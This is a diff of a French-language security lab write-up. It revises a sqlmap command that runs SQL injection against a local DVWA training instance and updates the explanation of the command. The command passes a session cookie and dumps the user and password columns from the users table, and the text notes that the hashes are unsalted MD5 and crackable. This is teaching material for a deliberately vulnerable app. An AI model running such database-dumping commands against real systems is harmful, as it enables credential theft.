@@ -771,10 +771,10 @@ Au lieu de `1` (un seul utilisateur normalement). Le flag `-b` envoie le cookie 
 **Commande :**
 ```bash
 cd rendu_labs/jour-01
-# 🔄 Si cookie expiré, décommentez la ligne ci-dessous :
-# source env.sh && bash ../../labs_resolution/jour-01/setup_dvwa.sh
+# 🔄 Si cookie expiré, renouvelez-le d'abord (voir note ci-dessus)
+SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --load-cookies=/tmp/dvwa_cookie.txt \
+  --cookie="security=low; PHPSESSID=$SESSID" \
   -D dvwa -T users -C user,password --dump --batch --no-cast --threads=3
 ```
 
@@ -791,7 +791,7 @@ sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
 +---------+---------------------------------------------+
 ```
 
-**Explication :** `--load-cookies` importe la session pour que DVWA nous reconnaisse. `-D dvwa -T users -C user,password` cible la table et les colonnes à extraire. `--dump` vide le contenu. `--batch` répond automatiquement "oui" aux questions de sqlmap. Les hashs sont au format MD5 non salé — vulnérable au craquage (voir LAB-6).
+**Explication :** `--cookie="security=low; PHPSESSID=$SESSID"` transmet la session directement (alternative à `--load-cookies` qui échoue parfois avec le format Netscape). `-D dvwa -T users -C user,password` cible la table et les colonnes à extraire. `--dump` vide le contenu. `--batch` répond automatiquement "oui" aux questions de sqlmap. Les hashs sont au format MD5 non salé — vulnérable au craquage (voir LAB-6).
 
 ---
 
